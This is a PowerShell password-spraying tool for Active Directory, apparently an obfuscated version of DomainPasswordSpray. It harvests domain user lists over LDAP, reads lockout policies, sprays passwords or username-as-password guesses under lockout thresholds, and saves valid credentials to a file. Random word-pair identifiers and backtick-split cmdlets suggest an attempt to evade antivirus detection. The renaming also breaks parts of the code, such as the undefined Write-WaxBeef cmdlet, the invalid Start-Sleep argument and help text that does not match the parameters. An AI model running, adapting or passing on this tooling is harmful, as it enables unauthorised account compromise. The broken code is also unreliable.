function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    .PARAMETER UserList

    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .PARAMETER Force

    Forces the spray to continue and doesn't prompt for confirmation.

    .PARAMETER Fudge

    Extra wait time between each round of tests (seconds).

    .PARAMETER Quiet

    Less output so it will work better with things like Cobalt Strike

    .PARAMETER UsernameAsPassword

    For each user, will try that user's name as their password

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -DetectFit Winter2016

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -TireReal users.txt -LivingAfraid domain-name -EarTreat passlist.txt -ScrubTrucks sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -PunishStage -ScrubTrucks valid-creds.txt

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate as each user by using their username as their password. Any valid credentials will be saved to valid-creds.txt

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $TireReal = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $DetectFit,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $EarTreat,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $ScrubTrucks,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $PurpleReward = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $LivingAfraid = "",

     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $GustyDrain,

     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $PunishStage,

     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $JuicyPedal=0,

     [Parameter(Position = 9, Mandatory = $false)]
     $BoreMale=0,

     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $ItchBrainy,

     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $FaceSilver=10
    )

    if ($DetectFit)
    {
        $BanBlack = @($DetectFit)
    }
    elseif($PunishStage)
    {
        $BanBlack = ""
    }
    elseif($EarTreat)
    {
        $BanBlack = Get-Content $EarTreat
    }
    else
    {
        Write-WaxBeef -ForegroundColor Red "The -DetectFit or -EarTreat option must be specified"
        break
    }

    try
    {
        if ($LivingAfraid -ne "")
        {
            # Using domain specified with -LivingAfraid option
            $HeadySin = ne`w-obje`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$LivingAfraid)
            $UnusedFixed = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($HeadySin)
            $GripRiddle = "LDAP://" + ([ADSI]"LDAP://$LivingAfraid").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $UnusedFixed = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $GripRiddle = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-WaxBeef -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -LivingAfraid option."
        break
    }

    if ($TireReal -eq "")
    {
        $DesertFang = Get-DomainUserList -LivingAfraid $LivingAfraid -MouthElite -ShakeCrawl -PurpleReward $PurpleReward
    }
    else
    {
        # if a Userlist is specified use it and do not check for lockout thresholds
        Write-WaxBeef "[*] Using $TireReal as userlist to spray with"
        Write-WaxBeef -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $DesertFang = @()
        try
        {
            $DesertFang = Get-Content $TireReal -ErrorAction stop
        }
        catch [Exception]
        {
            Write-WaxBeef -ForegroundColor "red" "$_.Exception"
            break
        }

    }


    if ($BanBlack.count -gt 1)
    {
        Write-WaxBeef -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }

    $BitterSoap = Get-ObservationWindow $GripRiddle

    Write-WaxBeef -ForegroundColor Yellow "[*] The domain password policy observation window is set to $BitterSoap minutes."
    Write-WaxBeef "[*] Setting a $BitterSoap minute wait in between sprays."

    # if no force flag is set we will ask if the user is sure they want to spray
    if (!$GustyDrain)
    {
        $SmellyQuiet = "Confirm Password Spray"
        $CobwebDizzy = "Are you sure you want to perform a password spray against " + $DesertFang.count + " accounts?"

        $FuelTrot = ne`w-obje`ct System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $IckyWander = ne`w-obje`ct System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $BirdsCast = [System.Management.Automation.Host.ChoiceDescription[]]($FuelTrot, $IckyWander)

        $ServeRely = $WaxBeef.ui.PromptForChoice($SmellyQuiet, $CobwebDizzy, $BirdsCast, 0)

        if ($ServeRely -ne 0)
        {
            Write-WaxBeef "Cancelling the password spray."
            break
        }
    }
    Write-WaxBeef -ForegroundColor Yellow "[*] Password spraying has begun with " $BanBlack.count " passwords"
    Write-WaxBeef "[*] This might take a while depending on the total number of users"

    if($PunishStage)
    {
        Invoke-SpraySinglePassword -LivingAfraid $GripRiddle -DesertFang $DesertFang -ScrubTrucks $ScrubTrucks -JuicyPedal $JuicyPedal -BoreMale $BoreMale -PunishStage -ItchBrainy $ItchBrainy
    }
    else
    {
        for($WhiteSense = 0; $WhiteSense -lt $BanBlack.count; $WhiteSense++)
        {
            Invoke-SpraySinglePassword -LivingAfraid $GripRiddle -DesertFang $DesertFang -DetectFit $BanBlack[$WhiteSense] -ScrubTrucks $ScrubTrucks -JuicyPedal $JuicyPedal -BoreMale $BoreMale -ItchBrainy $ItchBrainy
            if (($WhiteSense+1) -lt $BanBlack.count)
            {
                Countdown-Timer -BaseTumble (60*$BitterSoap + $FaceSilver) -ItchBrainy $ItchBrainy
            }
        }
    }

    Write-WaxBeef -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($ScrubTrucks -ne "")
    {
        Write-WaxBeef -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $ScrubTrucks"
    }
}

function Countdown-Timer
{
    param(
        $BaseTumble = 1800,
        $CobwebDizzy = "[*] Pausing to avoid account lockout.",
        [switch] $ItchBrainy = $False
    )
    if ($ItchBrainy)
    {
        Write-WaxBeef "$CobwebDizzy: Waiting for $($BaseTumble/60) minutes. $($BaseTumble - $PestTemper)"
        Start-Sleep -BaseTumble $BaseTumble
    } else {
        foreach ($PestTemper in (1..$BaseTumble))
        {
            Write-Progress -Id 1 -Activity $CobwebDizzy -Status "Waiting for $($BaseTumble/60) minutes. $($BaseTumble - $PestTemper) seconds remaining" -PercentComplete (($PestTemper / $BaseTumble) * 100)
            Start-Sleep -BaseTumble 1
        }
        Write-Progress -Id 1 -Activity $CobwebDizzy -Status "Completed" -PercentComplete 100 -Completed
    }
}

function Get-DomainUserList
{
<#
    .SYNOPSIS

    This module gathers a userlist from the domain.

    DomainPasswordSpray Function: Get-DomainUserList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))

    .PARAMETER RemovePotentialLockouts

    Removes accounts within 1 attempt of locking out.

    .PARAMETER Filter

    Custom LDAP filter for users, e.g. "(description=*admin*)"

    .EXAMPLE

    PS C:\> Get-DomainUserList

    Description
    -----------
    This command will gather a userlist from the domain including all samAccountType "805306368".

    .EXAMPLE

    C:\PS> Get-DomainUserList -LivingAfraid domainname -MouthElite -ShakeCrawl | `out`-f`i`le -Encoding ascii userlist.txt

    Description
    -----------
    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"

    #>
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $LivingAfraid = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $MouthElite,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $ShakeCrawl,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $PurpleReward
    )

    try
    {
        if ($LivingAfraid -ne "")
        {
            # Using domain specified with -LivingAfraid option
            $HeadySin = ne`w-obje`ct System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$LivingAfraid)
            $UnusedFixed =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($HeadySin)
            $GripRiddle = "LDAP://" + ([ADSI]"LDAP://$LivingAfraid").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $UnusedFixed =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $GripRiddle = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-WaxBeef -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -LivingAfraid option."
        break
    }

    # Setting the current domain's account lockout threshold
    $DogsBloody = [ADSI] "LDAP://$($UnusedFixed.PDCRoleOwner)"
    $SteadyEvent = @()
    $SteadyEvent += $DogsBloody.Properties.lockoutthreshold

    # Getting the AD behavior version to determine if fine-grained password policies are possible
    $MugAcid = [int] $DogsBloody.Properties['msds-behavior-version'].item(0)
    if ($MugAcid -ge 3)
    {
        # Determine if there are any fine-grained password policies
        Write-WaxBeef "[*] Current domain is compatible with Fine-Grained Password Policy."
        $KeenArch = ne`w-obje`ct System.DirectoryServices.DirectorySearcher
        $KeenArch.SearchRoot = $DogsBloody
        $KeenArch.Filter = "(objectclass=msDS-PasswordSettings)"
        $KnitAttack = $KeenArch.FindAll()

        if ( $KnitAttack.count -gt 0)
        {
            Write-WaxBeef -foregroundcolor "yellow" ("[*] A total of " + $KnitAttack.count + " Fine-Grained Password policies were found.`r`n")
            foreach($PorterAbject in $KnitAttack)
            {
                # Selecting the lockout threshold, min pwd length, and which
                # groups the fine-grained password policy applies to
                $BawdyFull = $PorterAbject | Select-Object -ExpandProperty Properties
                $SteepSponge = $BawdyFull.name
                $LumpyCheese = $BawdyFull.'msds-lockoutthreshold'
                $NeatThaw = $BawdyFull.'msds-NeatThaw'
                $SkipPlough = $BawdyFull.'msds-minimumpasswordlength'
                # adding lockout threshold to array for use later to determine which is the lowest.
                $SteadyEvent += $LumpyCheese

                Write-WaxBeef "[*] Fine-Grained Password Policy titled: $SteepSponge has a Lockout Threshold of $LumpyCheese attempts, minimum password length of $SkipPlough chars, and applies to $NeatThaw.`r`n"
            }
        }
    }

    $BitterSoap = Get-ObservationWindow $GripRiddle

    # Generate a userlist from the domain
    # Selecting the lowest account lockout threshold in the domain to avoid
    # locking out any accounts.
    [int]$EvenSoda = $SteadyEvent | sort | Select -First 1
    Write-WaxBeef -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."

    if ($EvenSoda -eq "0")
    {
        Write-WaxBeef -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-WaxBeef -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $EvenSoda login attempts."
    }

    $SideShaggy = ne`w-obje`ct System.DirectoryServices.DirectorySearcher([ADSI]$GripRiddle)
    $CoughGreet = ne`w-obje`ct System.DirectoryServices.DirectoryEntry
    $SideShaggy.SearchRoot = $CoughGreet

    $SideShaggy.PropertiesToLoad.Add("samaccountname") > $Null
    $SideShaggy.PropertiesToLoad.Add("badpwdcount") > $Null
    $SideShaggy.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($MouthElite)
    {
        Write-WaxBeef -ForegroundColor "yellow" "[*] Removing disabled users from list."
        # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
        # LDAP 1.2.840.113556.1.4.803 means bitwise &
        # uac 0x2 is ACCOUNTDISABLE
        # uac 0x10 is LOCKOUT
        # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
        $SideShaggy.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$PurpleReward)"
    }
    else
    {
        $SideShaggy.filter = "(&(objectCategory=person)(objectClass=user)$PurpleReward)"
    }

    $SideShaggy.PropertiesToLoad.add("samaccountname") > $Null
    $SideShaggy.PropertiesToLoad.add("lockouttime") > $Null
    $SideShaggy.PropertiesToLoad.add("badpwdcount") > $Null
    $SideShaggy.PropertiesToLoad.add("badpasswordtime") > $Null

    #Write-WaxBeef $SideShaggy.filter

    # grab batches of 1000 in results
    $SideShaggy.PageSize = 1000
    $WriterDucks = $SideShaggy.FindAll()
    Write-WaxBeef -ForegroundColor "yellow" ("[*] There are " + $WriterDucks.count + " total users found.")
    $DesertFang = @()

    if ($ShakeCrawl)
    {
        Write-WaxBeef -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($LegsSky in $WriterDucks)
        {
            # Getting bad password counts and lst bad password time for each user
            $CopperFruit = $LegsSky.Properties.badpwdcount
            $PauseMelted = $LegsSky.Properties.samaccountname
            try
            {
                $HuskyTrust = $LegsSky.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $PrettyProse = Get-Date
            $TicketDoll = [DateTime]::FromFileTime($HuskyTrust)
            $HomelyDesert = ($PrettyProse - $TicketDoll).TotalMinutes

            if ($CopperFruit)
            {
                [int]$BoastSilver = [convert]::ToInt32($CopperFruit, 10)
                $RoomFriend = $EvenSoda - $BoastSilver
                # if there is more than 1 attempt left before a user locks out
                # or if the time since the last failed login is greater than the domain
                # observation window add user to spray list
                if (($HomelyDesert -gt $BitterSoap) -or ($RoomFriend -gt 1))
                                {
                    $DesertFang += $PauseMelted
                }
            }
        }
    }
    else
    {
        foreach ($LegsSky in $WriterDucks)
        {
            $PauseMelted = $LegsSky.Properties.samaccountname
            $DesertFang += $PauseMelted
        }
    }

    Write-WaxBeef -foregroundcolor "yellow" ("[*] Created a userlist containing " + $DesertFang.count + " users gathered from the current user's domain")
    return $DesertFang
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $LivingAfraid,
            [Parameter(Position=2)]
            [string[]]
            $DesertFang,
            [Parameter(Position=3)]
            [string]
            $DetectFit,
            [Parameter(Position=4)]
            [string]
            $ScrubTrucks,
            [Parameter(Position=5)]
            [int]
            $JuicyPedal=0,
            [Parameter(Position=6)]
            [double]
            $BoreMale=0,
            [Parameter(Position=7)]
            [switch]
            $PunishStage,
            [Parameter(Position=7)]
            [switch]
            $ItchBrainy
    )
    $DapperSulky = Get-Date
    $PestTemper = $DesertFang.count
    Write-WaxBeef "[*] Now trying password $DetectFit against $PestTemper users. Current time is $($DapperSulky.ToShortTimeString())"
    $SaveTin = 0
    if ($ScrubTrucks -ne ""-and -not $ItchBrainy)
    {
        Write-WaxBeef -ForegroundColor Yellow "[*] Writing successes to $ScrubTrucks"    
    }
    $MarkedFirst = ne`w-obje`ct System.Random

    foreach ($LegsSky in $DesertFang)
    {
        if ($PunishStage)
        {
            $DetectFit = $LegsSky
        }
        $NightDonkey = ne`w-obje`ct System.DirectoryServices.DirectoryEntry($LivingAfraid,$LegsSky,$DetectFit)
        if ($NightDonkey.name -ne $null)
        {
            if ($ScrubTrucks -ne "")
            {
                Add-Content $ScrubTrucks $LegsSky`:$DetectFit
            }
            Write-WaxBeef -ForegroundColor Green "[*] SUCCESS! User:$LegsSky Password:$DetectFit"
        }
        $SaveTin += 1
        if (-not $ItchBrainy)
        {
            Write-WaxBeef -nonewline "$SaveTin of $PestTemper users tested`r"
        }
        if ($JuicyPedal)
        {
            Start-Sleep -BaseTumble $MarkedFirst.Next((1-$BoreMale)*$JuicyPedal, (1+$BoreMale)*$JuicyPedal)
        }
    }

}

function Get-ObservationWindow($SuckSpring)
{
    # Get account lockout observation window to avoid running more than 1
    # password spray per observation window.
    $FrogsFail = $SuckSpring.Properties['lockoutObservationWindow']
    $BitterSoap = $SuckSpring.ConvertLargeIntegerToInt64($FrogsFail.Value) / -600000000
    return $BitterSoap
}
